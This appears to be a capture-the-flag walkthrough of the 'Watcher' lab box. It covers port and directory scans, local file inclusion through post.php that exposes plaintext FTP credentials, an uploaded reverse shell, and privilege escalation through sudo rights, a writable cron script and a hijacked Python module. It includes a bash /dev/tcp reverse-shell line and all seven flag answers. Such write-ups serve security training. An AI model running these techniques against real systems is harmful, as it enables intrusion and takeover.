> Watcher

**export IP=10.10.118.204**

# Nmap

nmap -sC -sV -T4 -Pn -p- -vv -oN nmap/initial $IP

```
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Jekyll v4.1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Corkplacemats
```

# Gobuster

sudo gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x txt,php,sql,bak,zip,tar,js,bin,cgi -o gobuster/initial

```
/images (Status: 301)
/index.php (Status: 200)
/post.php (Status: 200)
/css (Status: 301)
/robots.txt (Status: 200)
```

# Nikto

nikto -h http://$IP

```
+ Entry '/flag_1.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
```

# robots.txt

```
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
```

# Flag1.txt

```
FLAG{robots_dot_text_what_is_next}
```

We can't read the other file let's move onto investigating the page-source. And we found a url `http://10.10.32.232/post.php?post=striped.php`. Looks like we can acess files using LFI. Let's try the other file.

`http://10.10.32.232/post.php?post=secret_file_do_not_read.txt` and we have the contents and FTP username and password.

```
  Hi Mat,

The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files.

Will

----------

ftpuser:givemefiles777
```

We got 2 usernames `Mat` and `Will`. We can now login to ftp and we have a directory `files` and `flag2.txt`

# Flag2.txt

```
FLAG{ftp_you_and_me}
```

We have write access to files directory in FTP and now we can put a simple reverse shell in and access it using post.php. We got a reverse shell!!

In `/var/www/html/more_secrets_a9f10a` we got flag3.txt

# Flag3.txt

```
FLAG{lfi_what_a_guy}
```

sudo -l

```
User www-data may run the following commands on watcher:
    (toby) NOPASSWD: ALL
```

sudo -u toby bash. We are in as `toby`

# Flag4.txt

```
FLAG{chad_lifestyle}
```

Let's search /home directory. 

# toby

## note.txt

```
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
```

In /jobs direcotry, we got `cow.sh`. 

```
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
bash -i >& /dev/tcp/10.8.107.21/1233 0>&1
```

cow.sh is run by mat and we have write access as toby.

## /etc/crontab

```
*/1 * * * * mat /home/toby/jobs/cow.sh
```

# Flag5.txt

```
FLAG{live_by_the_cow_die_by_the_cow}
```

## note.txt

```
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
```

sudo -l

```
User mat may run the following commands on watcher:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

We have `cmd.py` and `will_script.py`. 

will_script.py makes use of cmd.py using function get_command. Let's chane the contents of cmd.py with a python reverse shell and execute will_script.py.

sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1

We are in as will.

# Flag 6

```
FLAG{but_i_thought_my_script_was_secure}
```

In /opt directory we got /backups. And we got `key.b64` which is base64 encoded. And decoding it we got SSH key.

chmod 600 id_rsa
ssh -i id_rsa root@$IP

# Flag7.txt

```
FLAG{who_watches_the_watchers}
```